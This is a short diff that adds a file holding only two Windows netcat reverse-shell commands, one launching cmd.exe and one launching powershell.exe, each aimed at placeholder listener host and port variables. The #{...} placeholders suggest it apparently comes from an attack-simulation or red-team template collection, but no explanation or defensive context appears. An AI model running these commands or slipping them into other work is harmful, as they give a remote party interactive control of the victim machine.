@@ -1,0 +1,3 @@
+nc.exe -e cmd.exe #{LHOST} #{LPORT}
+
+nc.exe -e powershell.exe #{LHOST} #{LPORT}
